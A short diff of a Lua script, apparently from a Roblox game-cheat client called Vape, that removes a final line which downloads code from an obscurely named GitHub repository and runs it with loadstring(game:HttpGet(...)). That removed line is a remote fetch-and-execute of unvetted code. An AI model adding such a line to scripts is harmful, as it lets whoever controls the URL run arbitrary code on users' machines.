@@ -145,5 +145,3 @@ else
 end
 
 shared.VapeFullyLoaded = true
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/pifaifiohawiohh8924920904444ffsfszcz/DHOHDOAHDA-HDDDA/main/Anti-Crash.lua", true))()
